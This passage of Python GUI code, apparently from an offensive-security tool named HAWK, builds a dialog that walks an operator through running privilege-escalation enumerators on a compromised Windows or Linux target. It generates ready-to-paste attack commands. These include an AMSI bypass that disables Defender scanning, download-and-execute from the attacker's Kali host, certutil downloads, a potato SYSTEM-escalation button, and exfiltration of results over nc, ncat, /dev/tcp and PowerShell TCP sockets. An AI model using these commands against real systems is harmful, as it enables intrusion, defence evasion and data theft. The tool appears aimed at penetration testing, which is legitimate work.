                    if self._app and hasattr(self._app, "terminal"):
                        self._app.terminal.write(
                            f"  [!] Potato picker failed to open: {e}",
                            "error")
            btn_row = ctk.CTkFrame(warn_box, fg_color="transparent")
            btn_row.pack(fill="x", padx=10, pady=(0, 8))
            ctk.CTkButton(
                btn_row, text="🥔  GET SYSTEM VIA POTATO",
                width=260, height=28,
                font=_f("sm", True),
                fg_color=COLORS["bg_secondary"],
                hover_color=COLORS["bg_card_hover"],
                border_color=COLORS["text_yellow"], border_width=1,
                text_color=COLORS["text_yellow"], corner_radius=3,
                command=_open_potato,
            ).pack(side="left")

        # ── Tab selector: FILE REDIRECT vs LIVE STREAM ────────────────────
        tab_var = ctk.StringVar(value="redirect")
        tab_row = ctk.CTkFrame(parent, fg_color="transparent")
        tab_row.pack(fill="x", padx=4, pady=(0, 4))

        redirect_body = ctk.CTkFrame(parent, fg_color="transparent")
        stream_body   = ctk.CTkFrame(parent, fg_color="transparent")

        def _show_tab(val):
            # `after=tab_row` pins the exec-command body immediately below the
            # toggle buttons.  Without it, a plain .pack() appends to the END
            # of the scroll frame: on first render that happens to be the
            # right place (Steps 4/5 aren't built yet), but on a LATER toggle
            # — Steps 4/5 already packed — the body lands after Step 5, so the
            # run/monitor commands jump to the bottom of the dialog.
            tab_var.set(val)
            if val == "redirect":
                redirect_body.pack(fill="x", padx=4, after=tab_row)
                stream_body.pack_forget()
                tab_redirect.configure(fg_color=COLORS["bg_secondary"],
                                        border_color=COLORS["text_cyan"])
                tab_stream.configure(fg_color=COLORS["bg_card"],
                                      border_color=COLORS["border_dim"])
            else:
                stream_body.pack(fill="x", padx=4, after=tab_row)
                redirect_body.pack_forget()
                tab_stream.configure(fg_color=COLORS["bg_secondary"],
                                      border_color=COLORS["text_cyan"])
                tab_redirect.configure(fg_color=COLORS["bg_card"],
                                        border_color=COLORS["border_dim"])

        tab_redirect = ctk.CTkButton(
            tab_row,
            text="📁  RUN + SAVE TO FILE  (recommended)",
            width=300, height=28,
            font=_f("sm", True),
            fg_color=COLORS["bg_secondary"],
            hover_color=COLORS["bg_card_hover"],
            border_color=COLORS["text_cyan"], border_width=1,
            text_color=COLORS["text_cyan"], corner_radius=3,
            command=lambda: _show_tab("redirect"))
        tab_redirect.pack(side="left", padx=(0, 6))

        tab_stream = ctk.CTkButton(
            tab_row,
            text="📡  RUN + STREAM LIVE  (advanced)",
            width=280, height=28,
            font=_f("sm", True),
            fg_color=COLORS["bg_card"],
            hover_color=COLORS["bg_card_hover"],
            border_color=COLORS["border_dim"], border_width=1,
            text_color=COLORS["text_dim"], corner_radius=3,
            command=lambda: _show_tab("stream"))
        tab_stream.pack(side="left")

        # ── FILE REDIRECT body ────────────────────────────────────────────
        if self._script_name.lower().startswith("winpeas"):
            _is_ps1 = self._script_name.lower().endswith(".ps1")
            if _is_ps1:
                # Invoke-WinPEAS.ps1 — dot-source the script then
                # call the exported Invoke-WinPEAS function and
                # pipe the captured output into Set-Content.
                self._cmd_row(redirect_body, "PowerShell RUN:",
                    f"powershell -ep bypass -c \""
                    f". '{self._remote_path}'; "
                    f"Invoke-WinPEAS | Out-String | "
                    f"Set-Content -Path '{self._remote_out}'\"",
                    hint="Dot-sources the .ps1 from the path it was "
                         "transferred to in Step 2, invokes the "
                         "Invoke-WinPEAS function, captures console "
                         "output to the .out file for exfil.")
                self._cmd_row(redirect_body, "with AMSI bypass:",
                    f"powershell -ep bypass -c \""
                    f"[Ref].Assembly.GetType("
                    f"'System.Management.Automation.AmsiUtils')"
                    f".GetField('amsiInitFailed','NonPublic,Static')"
                    f".SetValue($null,$true); "
                    f". '{self._remote_path}'; "
                    f"Invoke-WinPEAS | Out-String | "
                    f"Set-Content -Path '{self._remote_out}'\"",
                    hint="Same as above but with the standard "
                         "AmsiUtils flag flip so Defender doesn't "
                         "scan the dot-source read.  Use on "
                         "AV-protected targets.")
            else:
                self._cmd_row(redirect_body, "cmd.exe RUN:",
                    f"{self._remote_path} > {self._remote_out} 2>&1",
                    hint="Paste in target cmd.exe — runs the binary "
                         "and redirects stdout + stderr to the "
                         "output file.")
                self._cmd_row(redirect_body, "PowerShell RUN:",
                    f"powershell -c \"& '{self._remote_path}' "
                    f"*> '{self._remote_out}'\"",
                    hint="Paste in target PowerShell — same as cmd "
                         "above but captures ALL streams "
                         "(verbose/warning/info).")
        elif self._script_name.lower().startswith("privesccheck"):
            # Common AMSI-bypass + IEX-download prefix.  Stealth-aware:
            # the URL points at the random-hex file served by Step 1
            # when stealth mode is ON, at the real PrivescCheck.ps1
            # when OFF.
            _ps_xfer = getattr(self, "_transfer_name",
                                self._script_name)
            _amsi_iex = (
                f"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
                f".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); "
                f"IEX(New-Object Net.WebClient).DownloadString("
                f"'http://{self._kali_ip}:8000/{_ps_xfer}'); ")
            self._cmd_row(redirect_body, "console:",
                f"powershell -ep bypass -c \"{_amsi_iex}"
                f"Invoke-PrivescCheck\"",
                hint="Visual inspection only — output on screen, "
                     "nothing to exfil.  Use the 'to file' variant "
                     "below when you want to parse it in HAWK.")
            self._cmd_row(redirect_body, "to file:",
                f"powershell -ep bypass -c \"{_amsi_iex}"
                f"Invoke-PrivescCheck -Extended | Out-String | "
                f"Set-Content -Path '{self._remote_out}'\"",
                hint="Captures the full console report to "
                     f"{self._remote_out} — exfil with the nc "
                     "listener below, then OPEN OUTPUT parses it.")
            self._cmd_row(redirect_body, "on-disk:",
                f"powershell -ep bypass -c \""
                f". '{self._remote_path}'; "
                f"Invoke-PrivescCheck -Extended | Out-String | "
                f"Set-Content -Path '{self._remote_out}'\"",
                hint="Uses the .ps1 already uploaded in Step 2 — "
                     "handy when outbound HTTP is blocked but the "
                     "file transfer succeeded.  Dot-sources from the "
                     "stealth-aware _remote_path automatically.")
            self._cmd_row(redirect_body, "+HTML:",
                f"powershell -ep bypass -c \"{_amsi_iex}"
                f"Invoke-PrivescCheck -Extended -Report "
                f"'{self._remote_out}' -Format HTML,CSV\"",
                hint="Generates HTML + CSV reports (adds .html/.csv "
                     "extensions to the path).  Richer than console "
                     "output but HAWK's parser works on the text "
                     "version above — use the 'to file' variant for "
                     "auto-findings.")
        elif self._script_name.lower().startswith("powerup"):
            # PowerUp.ps1 — Invoke-AllChecks via PowerShell.
            # Three variants: on-screen preview, redirect to file (for
            # exfil + Step 5 review), and AMSI-bypassed redirect for
            # AV-protected targets.
            _amsi_bypass = (
                "[Ref].Assembly.GetType("
                "'System.Management.Automation.AmsiUtils')"
                ".GetField('amsiInitFailed','NonPublic,Static')"
                ".SetValue($null,$true); "
            )
            self._cmd_row(redirect_body, "console:",
                f"powershell -ep bypass -c \""
                f". '{self._remote_path}'; "
                f"Invoke-AllChecks\"",
                hint="Dot-sources PowerUp.ps1 from the path it was transferred to "
                     "in Step 2, then runs all privilege-escalation checks and prints "
                     "results on screen.  Use this for a quick visual inspection — "
                     "nothing is saved to disk.")
            self._cmd_row(redirect_body, "to file:",
                f"powershell -ep bypass -c \""
                f". '{self._remote_path}'; "
                f"Invoke-AllChecks | Out-String | "
                f"Set-Content -Path '{self._remote_out}'\"",
                hint="Same as above but captures the full output to "
                     f"{self._remote_out} on the target.  Exfiltrate it with the "
                     "nc listener in Step 4, then review in Step 5 inside HAWK.")
            self._cmd_row(redirect_body, "AMSI bypass:",
                f"powershell -ep bypass -c \""
                f"{_amsi_bypass}"
                f". '{self._remote_path}'; "
                f"Invoke-AllChecks | Out-String | "
                f"Set-Content -Path '{self._remote_out}'\"",
                hint="Use this variant when Windows Defender (AMSI) blocks the "
                     "dot-source.  The AmsiUtils flag flip disables the AMSI scanner "
                     "for this PowerShell process before the script is loaded.  "
                     "Output is saved to the same file as the 'to file' variant above.")
        elif self._script_name.startswith("linpeas"):
            # ROBUST WRAPPER (default).  `nohup … & disown` detaches
            # the process from the shell so:
            #   - the reverse-shell prompt comes BACK immediately
            #     (no 5-15min freeze waiting for linpeas)
            #   - if the reverse shell drops, linpeas keeps running
            #     and finishes the file on disk
            #   - </dev/null prevents linpeas from blocking on any
            #     interactive prompt (some checks call sudo -n, which
            #     can hang on certain pam configs)
            #   - exec </dev/null + 1>file 2>&1 + & + disown is the
            #     belt-and-braces detach pattern that works even on
            #     the buggiest dumb shells (busybox sh, dash, the
            #     fake shells from web RCEs, etc.)
            self._cmd_row(redirect_body, "run:",
                f"nohup {self._remote_path} -a "
                f"> {self._remote_out} 2>&1 < /dev/null & "
                f"echo \"[HAWK] linpeas PID=$! → "
                f"{self._remote_out}\"; disown 2>/dev/null",
                hint=("nohup + & + disown backgrounds the tool — the prompt "
                      "returns in ~2s but it is STILL RUNNING (not finished): "
                      "it writes the .out for the next ~5-15 min (longer on "
                      "old boxes).  -a = all checks.  Check 'alive?' below "
                      "before you exfil.  If the shell drops, it keeps going."))
            self._cmd_row(redirect_body, "foreground (alt):",
                f"{self._remote_path} -a 2>&1 | tee {self._remote_out}",
                hint=("Old behaviour — use this only on a stable "
                      "tmux/screen session where you want to watch "
                      "the colourised output live.  Will freeze the "
                      "shell for the full duration."))
        elif self._script_name.startswith("lse"):
            self._cmd_row(redirect_body, "run:",
                f"nohup {self._remote_path} -l 2 -i "
                f"> {self._remote_out} 2>&1 < /dev/null & "
                f"echo \"[HAWK] lse PID=$! → "
                f"{self._remote_out}\"; disown 2>/dev/null",
                hint=("-l 2 = deep level, -i = non-interactive.  "
                      "Backgrounded with nohup so the shell stays "
                      "responsive while lse runs."))
            self._cmd_row(redirect_body, "foreground (alt):",
                f"{self._remote_path} -l 2 -i 2>&1 | tee {self._remote_out}",
                hint="Old foreground behaviour — freezes the shell.")
        elif self._script_name.startswith("pspy"):
            # pspy is already designed to run in the background
            # (`-i 1000` polls every 1s), but the original cmd lacked
            # nohup, so killing the shell killed pspy.  Fixed.
            self._cmd_row(redirect_body, "run:",
                f"nohup {self._remote_path} -pf -i 1000 "
                f"> {self._remote_out} 2>&1 < /dev/null & "
                f"echo \"[HAWK] pspy PID=$! → "
                f"{self._remote_out}\"; disown 2>/dev/null",
                hint=("Monitors processes + file events in "
                      "background.  Survives shell drop thanks to "
                      "nohup; kill with `kill <PID>`."))
        else:
            self._cmd_row(redirect_body, "run:",
                f"nohup {self._remote_path} > {self._remote_out} "
                f"2>&1 < /dev/null & "
                f"echo \"[HAWK] PID=$! → {self._remote_out}\"; "
                f"disown 2>/dev/null")

        # Prominent "is it finished yet?" check, right under RUN — the #1
        # thing the operator needs after backgrounding the tool.  The same
        # pgrep also lives in MONITOR/alive? below, but that was buried and
        # easy to miss (the operator asked for it here).  Linux only: Windows
        # targets have no pgrep and use the MONITOR size-loop instead.
        if (self._os != "windows"
                and self._script_name.startswith(("linpeas", "lse", "pspy"))):
            self._cmd_row(redirect_body, "done?",
                f"pgrep -fl {self._script_name} || "
                f"echo '[HAWK] {self._script_name} FINISHED — go to Step 4'",
                hint=("Run any time to check progress: a PID line = STILL "
                      "running; the '[HAWK] … FINISHED' line = it's done, "
                      "exfil now (Step 4).  Uses -fl so it works on old boxes "
                      "(Metasploitable) whose procps has no -a."))

        # ── 3A Monitor section ────────────────────────────────────────────
        if self._os == "windows":
            mon_frame = ctk.CTkFrame(redirect_body, fg_color=COLORS["bg_card"],
                                      border_color=COLORS["border_dim"],
                                      border_width=1, corner_radius=4)
            mon_frame.pack(fill="x", pady=(8, 2))
            ctk.CTkLabel(mon_frame,
                         text="  📊  MONITOR — open a SECOND shell on the target and run:",
                         font=_f("sm", True), text_color=COLORS["text_bright"],
                         anchor="w").pack(fill="x", padx=8, pady=(6, 2))

            # PowerShell loop — works in ALL shell types (reverse shell,
            # netcat, evil-winrm, psexec).  The old cmd :check/goto loop
            # only works inside a .bat file; in an interactive shell goto
            # runs once and exits.  PowerShell while($true) is always safe.
            fname = self._remote_out.replace("\\", "\\\\")
            monitor_loop = (
                f"powershell -c \"while($true)"
                f"{{$f=Get-Item '{self._remote_out}' -EA SilentlyContinue;"
                f"if($f){{'['+$(Get-Date -f HH:mm:ss)+'] Size: '+$f.Length+' bytes'}};"
                f"Start-Sleep 30}}\""
            )
            self._cmd_row(mon_frame, "PS loop:", monitor_loop,
                hint="PowerShell: works in reverse shells, netcat, evil-winrm — size growing = still working | no change 10+ min = stuck | 0 bytes after 2 min = output redirection failed")

            # Fallback: write bat file from cmd (for shells without PS)
            out_name = self._remote_out.split("\\")[-1]
            bat_path = "C:\\Windows\\Temp\\mon.bat"
            bat_loop = (
                f"echo :check> {bat_path} && "
                f"echo for /f \"tokens=4\" %%a in ('dir {self._remote_out} ^| find /i \"{out_name}\"') do echo [%%TIME%%] Size: %%a bytes>> {bat_path} && "
                f"echo ping -n 31 127.0.0.1 ^>nul>> {bat_path} && "
                f"echo goto check>> {bat_path} && "
                f"{bat_path}"
            )
            self._cmd_row(mon_frame, "cmd fallback:", bat_loop,
                hint="If PowerShell is blocked — writes a .bat to Temp and runs it")

            # Expected size reference
            if self._script_name.lower().endswith(".bat"):
                size_ref = "winpeas.bat → expected ~1-2 MB when complete (30-40 min)"
                size_color = COLORS["text_yellow"]
            elif self._script_name.lower().endswith(".exe"):
                size_ref = "winpeas.exe → expected ~300-800 KB when complete (2-4 min)"
                size_color = COLORS["text_yellow"]
            elif self._script_name.lower().startswith("powerup"):
                size_ref = "PowerUp.ps1 → expected ~20-80 KB when complete (1-3 min)"
                size_color = COLORS["text_yellow"]
            else:
                size_ref = "PrivescCheck → expected ~150-500 KB if -Report used (2-4 min)"
                size_color = COLORS["text_green"]

            ctk.CTkLabel(mon_frame,
                         text=f"  📦  Reference: {size_ref}",
                         font=_f("sm"), text_color=size_color,
                         anchor="w").pack(fill="x", padx=8, pady=(2, 6))

        # Linux equivalent — mirrors the Windows monitor section.
        # Backgrounded linpeas/lse/pspy still need observability:
        # the operator wants to know whether the script is making
        # progress, has stalled, or has finished without re-checking
        # `ls -la` manually.
        elif self._os != "windows" and (
                self._script_name.startswith("linpeas")
                or self._script_name.startswith("lse")
                or self._script_name.startswith("pspy")):
            mon_frame = ctk.CTkFrame(redirect_body,
                                      fg_color=COLORS["bg_card"],
                                      border_color=COLORS["border_dim"],
                                      border_width=1, corner_radius=4)
            mon_frame.pack(fill="x", pady=(8, 2))
            ctk.CTkLabel(mon_frame,
                         text=("  📊  MONITOR — paste in the SAME shell "
                               "to watch progress (Ctrl+C to stop "
                               "watching; the tool keeps running):"),
                         font=_f("sm", True),
                         text_color=COLORS["text_bright"],
                         anchor="w").pack(fill="x", padx=8, pady=(6, 2))

            # Watcher loop — pure POSIX so it works on busybox sh,
            # dash, ash, bash, zsh.  Stops when the file size hasn't
            # grown for 10 consecutive 30s ticks (= 5 min stuck) so
            # the operator gets an explicit "STUCK" alert rather than
            # staring at unchanging bytes.
            watch_loop = (
                f"P={self._remote_out}; L=0; S=0; "
                "while sleep 30; do "
                "  N=$(stat -c%s \"$P\" 2>/dev/null || echo 0); "
                "  T=$(date +%H:%M:%S); "
                "  echo \"[$T] size: $N bytes\"; "
                "  if [ \"$N\" = \"$L\" ]; then "
                "    S=$((S+1)); "
                "    [ $S -ge 10 ] && "
                "      echo \"[$T] STUCK — no growth for 5min\" && break; "
                "  else S=0; fi; "
                "  L=$N; "
                "done"
            )
            self._cmd_row(mon_frame, "watch:", watch_loop,
                hint=("Polls the output file size every 30s.  size "
                      "growing = still working.  no change for 5min "
                      "= STUCK alert (kill the PID echoed by the run "
                      "command and inspect what's hanging).  0 bytes "
                      "after 2min = redirection failed (check that "
                      "the binary is executable and the path is "
                      "correct)."))
            # Quick one-shot status check
            self._cmd_row(mon_frame, "status:",
                f"ls -la {self._remote_out} 2>/dev/null && "
                f"echo \"--- last 20 lines ---\" && "
                f"tail -n 20 {self._remote_out} 2>/dev/null",
                hint=("Single-shot check — size + tail of the output "
                      "file.  Run any time to see what linpeas is "
                      "currently chewing on without committing to a "
                      "watch loop."))
            # Hang detector: if the python process holding linpeas is
            # not in `ps`, the script is dead — the operator needs
            # to know quickly so they don't keep waiting.
            self._cmd_row(mon_frame, "alive?:",
                f"pgrep -fl "
                f"\"{os.path.basename(self._script_name)}\" 2>/dev/null "
                f"|| echo \"[HAWK] not running — check {self._remote_out}\"",
                hint=("Checks whether the script's process is still in the ps "
                      "table.  A printed PID line = STILL RUNNING; the "
                      "'[HAWK] not running' line = it ended (look at the tail "
                      "of the output file to find out why).  Uses -fl (not "
                      "-af): old targets like Metasploitable have a procps "
                      "without -a, and -af there errors out and falsely "
                      "reports 'not running'."))

            # Expected size reference for the Linux scripts
            if self._script_name.startswith("linpeas"):
                size_ref = ("linpeas.sh → ~200-800 KB when complete "
                            "(5-15 min)")
            elif self._script_name.startswith("lse"):
                size_ref = ("lse.sh -l 2 -i → ~50-200 KB when complete "
                            "(2-5 min)")
            else:  # pspy
                size_ref = ("pspy → grows continuously while running; "
                            "kill it when you have enough events")
            ctk.CTkLabel(mon_frame,
                         text=f"  📦  Reference: {size_ref}",
                         font=_f("sm"),
                         text_color=COLORS["text_yellow"],
                         anchor="w").pack(fill="x", padx=8, pady=(2, 6))

        # Initial default tab.  after=tab_row keeps it consistent with
        # _show_tab so the body never drifts to the bottom on later toggles.
        redirect_body.pack(fill="x", padx=4, after=tab_row)

        # ── LIVE STREAM body (3C) ─────────────────────────────────────────
        ctk.CTkLabel(stream_body,
                     text="  See output in real time as the tool runs on the target.\n"
                          "  The tool output streams to your Kali terminal instead of a file.",
                     font=_f("sm"), text_color=COLORS["text_dim"],
                     anchor="w", justify="left").pack(fill="x", padx=6, pady=(4, 6))

        ctk.CTkLabel(stream_body,
                     text="  1.  On Kali — start listener FIRST:",
                     font=_f("sm", True), text_color=COLORS["text_bright"],
                     anchor="w").pack(fill="x", padx=6, pady=(2, 0))
        self._cmd_row(stream_body, "Kali:",
            f"nc -lvnp 9001 | tee {self._exfil_name}",
            hint="Receives the stream AND saves it to disk simultaneously")

        ctk.CTkLabel(stream_body,
                     text="  2.  On target — run with pipe to ncat (requires ncat on target):",
                     font=_f("sm", True), text_color=COLORS["text_bright"],
                     anchor="w").pack(fill="x", padx=6, pady=(8, 0))

        if self._os == "windows":
            if self._script_name.lower().startswith("privesccheck"):
                self._cmd_row(stream_body, "ncat:",
                    f"powershell -ep bypass -c \""
                    f"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
                    f".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); "
                    f"IEX(New-Object Net.WebClient).DownloadString("
                    f"'http://{self._kali_ip}:8000/PrivescCheck.ps1'); "
                    f"Invoke-PrivescCheck\" | ncat {self._kali_ip} 9001",
                    hint="PrivescCheck output streams live to Kali terminal")
            elif self._script_name.lower().startswith("powerup"):
                # PowerUp: dot-source from remote path + Invoke-AllChecks piped to ncat.
                # AMSI bypass included so Defender doesn't block the load mid-stream.
                self._cmd_row(stream_body, "ncat:",
                    f"powershell -ep bypass -c \""
                    f"[Ref].Assembly.GetType("
                    f"'System.Management.Automation.AmsiUtils')"
                    f".GetField('amsiInitFailed','NonPublic,Static')"
                    f".SetValue($null,$true); "
                    f". '{self._remote_path}'; "
                    f"Invoke-AllChecks | Out-String\" | ncat {self._kali_ip} 9001",
                    hint="Dot-sources PowerUp.ps1 (already on target from Step 2), "
                         "runs Invoke-AllChecks and pipes the text output live to "
                         "your Kali listener.  AMSI bypass is pre-pended so Defender "
                         "does not block the script load.")
                self._cmd_row(stream_body, "PS alt:",
                    f"powershell -ep bypass -c \""
                    f"[Ref].Assembly.GetType("
                    f"'System.Management.Automation.AmsiUtils')"
                    f".GetField('amsiInitFailed','NonPublic,Static')"
                    f".SetValue($null,$true); "
                    f". '{self._remote_path}'; "
                    f"Invoke-AllChecks | Out-String | "
                    f"ForEach-Object{{$b=[Text.Encoding]::UTF8.GetBytes($_+'`n');"
                    f"$s=New-Object Net.Sockets.TcpClient('{self._kali_ip}',9001);"
                    f"$n=$s.GetStream();$n.Write($b,0,$b.Length);$s.Close()}}\"",
                    hint="Pure PowerShell TCP sender — use this when ncat is not "
                         "available on the target.  Slower (one TCP connection per "
                         "line) but works in any PS session.")
            else:
                self._cmd_row(stream_body, "ncat:",
                    f"{self._remote_path} 2>&1 | ncat {self._kali_ip} 9001",
                    hint="If ncat is not on target, use the PowerShell alternative below")
                self._cmd_row(stream_body, "PS alt:",
                    f"powershell -c \"{self._remote_path} 2>&1 | "
                    f"ForEach-Object{{$b=[Text.Encoding]::UTF8.GetBytes($_+'`n');"
                    f"$s=New-Object Net.Sockets.TcpClient('{self._kali_ip}',9001);"
                    f"$n=$s.GetStream();$n.Write($b,0,$b.Length);$s.Close()}}\"",
                    hint="Pure PowerShell — no ncat needed, but slower (new connection per line)")
        else:
            self._cmd_row(stream_body, "nc:",
                f"{self._remote_path} 2>&1 | nc {self._kali_ip} 9001",
                hint="nc is almost always available on Linux targets")
            self._cmd_row(stream_body, "bash:",
                f"exec 3>/dev/tcp/{self._kali_ip}/9001; "
                f"{self._remote_path} 2>&1 | tee /proc/$$/fd/3",
                hint="Pure bash — no nc needed")

        ctk.CTkLabel(stream_body,
                     text="  ⚠   How to get ncat on Windows target:\n"
                          "      certutil -urlcache -split -f "
                          f"http://{self._kali_ip}:8000/ncat.exe C:\\Windows\\Temp\\ncat.exe\n"
                          "      (First: copy /usr/bin/ncat to your HAWK directory on Kali,\n"
                          "       or serve it from /usr/share/windows-resources/binaries/)",
                     font=_f("xs"), text_color=COLORS["text_muted"],
                     anchor="w", justify="left").pack(fill="x", padx=6, pady=(6, 4))

    # ───── Step 4: Exfiltrate the output ──────────────────────────────────

    def _build_step4_exfil(self, parent):
        self._section_header(parent, 4, "RETRIEVE OUTPUT (Kali listener ← target nc)")

        # The #1 live mistake (hit on MS2): the Step-3 run command returns the
        # prompt in ~2s because it BACKGROUNDS the tool — that is NOT
        # "finished".  Exfiltrating now pipes a half-written (often empty)
        # .out and the listener shows nothing.  Warn hard, right here.
        ctk.CTkLabel(
            parent,
            text=("  ⚠  Wait until the tool has FINISHED before exfiltrating — "
                  "the Step-3 prompt comes back instantly because it runs in "
                  "the background, NOT because it's done.  Run Step-3 "
                  "'alive?': only exfil once it shows nothing.  `nc` sends the "
                  ".out as-is, so a partial run sends partial (or empty) "
                  "output.  (pspy is continuous — for it, exfil whenever you "
                  "have enough events.)"),
            font=_f("sm", True), text_color=COLORS["text_yellow"],
            anchor="w", justify="left", wraplength=980).pack(
                fill="x", padx=8, pady=(2, 6))

        def _start_listener():
            from utils.runner import _open_terminal
            script = (
                f"echo '═══  HAWK — nc listener :9001  ═══'; "
                f"echo 'Waiting for target to pipe "
                f"{self._remote_out} → {self._exfil_path}'; echo ''; "
                f"cd {self._local_dir!r} && "
                f"nc -lnvp 9001 > {self._exfil_name!r}; "
                f"echo ''; echo '[+] Saved: {self._exfil_path}'; "
                f"read -p 'Press ENTER to close...'")
            ok = _open_terminal("HAWK — nc :9001 exfil", script)
            if self._app and hasattr(self._app, "terminal"):
                if ok:
                    self._app.terminal.write(
                        f"  [+] Listener started on :9001 → {self._exfil_path}",
                        "success")
                else:
                    self._app.terminal.write(
                        "  [!] Could not open terminal emulator.", "error")

        self._action_button(
            parent, "▶  START NC LISTENER  :9001  →  "
                    f"{self._exfil_name}",
            _start_listener, primary=True)

        if self._os == "linux":
            self._cmd_row(
                parent, "target:",
                f"nc -q 0 {self._kali_ip} 9001 < {self._remote_out}",
                hint="-q 0 makes nc CLOSE the connection right after sending. "
                     "Traditional / GNU netcat (old boxes like "
                     "Metasploitable) keeps the socket OPEN on stdin EOF, so "
                     "without -q the listener hangs forever and never prints "
                     "'Saved' — even though the file already transferred in "
                     "full.  If the target's nc rejects -q (OpenBSD nc), drop "
                     "it or use -N; either way the data still arrives, so you "
                     "can also just Ctrl-C the listener once the Kali file "
                     "stops growing.")
        else:
            self._cmd_row(
                parent, "target:",
                f"ncat {self._kali_ip} 9001 < {self._remote_out}",
                hint="If ncat is missing, try PowerShell TcpClient below")
            self._cmd_row(
                parent, "PS alt:",
                f"powershell -c \"$c=New-Object Net.Sockets.TcpClient("
                f"'{self._kali_ip}',9001); $s=$c.GetStream(); "
                f"[byte[]]$b=[IO.File]::ReadAllBytes('{self._remote_out}'); "
                f"$s.Write($b,0,$b.Length); $s.Close()\"")

    # ───── Step 5: Review output inside HAWK ──────────────────────────────

    def _build_step5_review(self, parent):
        self._section_header(parent, 5, "REVIEW RESULT (open in HAWK terminal)")

        def _open_result():
            import os as _os
            # ALWAYS open the file picker, every click — user explicitly
            # wants to choose / confirm which file to process on every
            # OPEN OUTPUT press, even if the expected .out exists at
            # self._exfil_path from a previous run.  Rationale: the
            # user may have multiple PEAS runs over time with the same
            # target and wants to disambiguate before re-parsing.
            #
            # We pre-seed `initialdir` to the directory where nc would
            # have saved it and `initialfile` to the expected basename,
            # so the common "just reparse what HAWK captured" path is
            # still a single confirm-and-go click.
            from tkinter import filedialog
            if _os.path.isdir(self._local_dir):
                start_dir = self._local_dir
            else:
                start_dir = _os.path.expanduser("~")
            initial_file = ""
            if _os.path.isfile(self._exfil_path):
                initial_file = _os.path.basename(self._exfil_path)
            if self._app and hasattr(self._app, "terminal"):
                self._app.terminal.write(
                    f"  [i] Opening file picker — select the PEAS "
                    f"output file to parse.",
                    "dim")
            # IMPORTANT: pass parent=self._win so the filedialog appears
            # on top of the HAWK window instead of behind it.
            picked = filedialog.askopenfilename(
                parent=self._win,
                title="Select PEAS output file",
                initialdir=start_dir,
                initialfile=initial_file,
                filetypes=[("Output files", "*.out *.txt *.log"),
                           ("All files", "*.*")])
            if not picked:
                # User cancelled — stay silent, don't spam the terminal.
                return
            path = picked
            if not self._app or not hasattr(self._app, "terminal"):
                return
            # ── Multi-encoding read ───────────────────────────────────
            # winpeas.bat output encoding depends on how the user ran it:
            #   CP850/OEM  → cmd.exe default (most common for .bat)
            #   UTF-16 LE  → PowerShell Out-File default
            #   UTF-8      → chcp 65001 / modern pwsh
            # We read raw bytes and try each encoding in order, accepting
            # the first one that produces recognisable winpeas markers
            # (╔, [+], [!], ====).  Fallback: UTF-8 with errors=replace.
            try:
                with open(path, "rb") as fh:
                    _raw = fh.read()
            except Exception as e:
                self._app.terminal.write(
                    f"  [!] Could not read {path}: {e}", "error")
                return
            content = None
            _MARKERS = ("╔", "╠", "[+]", "[!]", "====", "####")
            _ENCS = ["utf-8-sig", "utf-8", "cp850", "cp1252", "latin-1"]
            # UTF-16 LE BOM check first (PowerShell Out-File)
            if _raw[:2] == b"\xff\xfe":
                try:
                    content = _raw.decode("utf-16-le")
                except UnicodeDecodeError:
                    content = None
            if content is None:
                for _enc in _ENCS:
                    try:
                        _decoded = _raw.decode(_enc)
                        if any(m in _decoded for m in _MARKERS):
                            content = _decoded
                            break
                    except (UnicodeDecodeError, LookupError):
                        pass
            if content is None:
                # Last resort — UTF-8 with replacement chars
                content = _raw.decode("utf-8", errors="replace")
            term = self._app.terminal

            # ── Guard: empty exfil ────────────────────────────────────
            # A 0-byte / tiny .out means Step-4 exfil never transferred —
            # almost always because `nc` ran BEFORE the tool finished, or the
            # listener closed early.  Parsing it silently yielded "no findings"
            # with no clue why (found live on MS2).
            # Guard on SIZE ONLY, never on content markers: linpeas uses ╔/╠
            # box headers but LSE / pspy / PowerUp / PrivescCheck do NOT, so a
            # marker check wrongly rejected a valid 265 KB LSE capture (and its
            # "redo Step 4" advice made the operator re-listen, truncating the
            # good file to 0).  Any real PEAS output is tens of KB+, so
            # <256 bytes = a failed/empty transfer.
            if len(_raw) < 256:
                term.write(
                    f"  [!] '{_os.path.basename(path)}' is empty "
                    f"({len(_raw)} bytes) — nothing to parse.", "error")
                term.write(
                    "      The exfil didn't transfer.  Usual cause: `nc` ran "
                    "before the tool FINISHED, or the listener closed early.  "
                    "Redo Step 4 — confirm Step-3 'done?' shows FINISHED, "
                    "click START NC LISTENER, run the target `nc` again, then "
                    "re-open the file here.", "warn")
                return

            # ── Strip ANSI → write sibling .txt ───────────────────────
            # winpeas / linpeas output is dense with ANSI color codes
            # that render as garbage in text editors.  We write a
            # `.txt` (same basename, all escape sequences stripped) so
            # the user can open it in any editor and actually read it.
            # The raw `.out` is left in place for debugging.
            #
            # The picker above starts in $HOME, so the file the operator
            # chose may live anywhere; contained_sibling writes next to
            # it only when that is inside the HAWK tree, and falls back
            # to <HAWK>/outputs/ otherwise.  HAWK never writes into the
            # operator's home directory.
            # Show WHICH file (size + mtime) is being parsed.  Multiple runs
            # share the `linpeas-<ip>-<timestamp>` prefix, so it's easy to pick
            # an old / partial capture by mistake — printing the size and
            # modified-time makes "did I open the full, current file?" obvious.
            try:
                import time as _time
                _mt = _time.strftime(
                    "%Y-%m-%d %H:%M:%S",
                    _time.localtime(_os.path.getmtime(path)))
            except Exception:
                _mt = "?"
            term.write(
                f"  [i] Parsing {_os.path.basename(path)} "
                f"({len(_raw):,} bytes, modified {_mt})", "dim")

            import re as _re
            from utils.config import contained_sibling as _sibling
            _ansi_re = _re.compile(
                r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
            clean = _ansi_re.sub("", content)
            txt_path = _sibling(path, ".txt")
            try:
                # Structured header with TOC — the winpeas/linpeas
                # parsers (step B/D) overwrite this file with a fully
                # structured version; until then a plain header is
                # already better than raw ANSI.
                from datetime import datetime as _dt
                header = (
                    "═══════════════════════════════════════════════════"
                    "════════════\n"
                    f"  HAWK — {self._script_name} output  —  "
                    f"{self._target}\n"
                    f"  Parsed: {_dt.now().strftime('%Y-%m-%d %H:%M:%S')}"
                    f"   ·   Source: {_os.path.basename(path)}\n"
                    "═══════════════════════════════════════════════════"
                    "════════════\n\n")
                with open(txt_path, "w", encoding="utf-8") as fh:
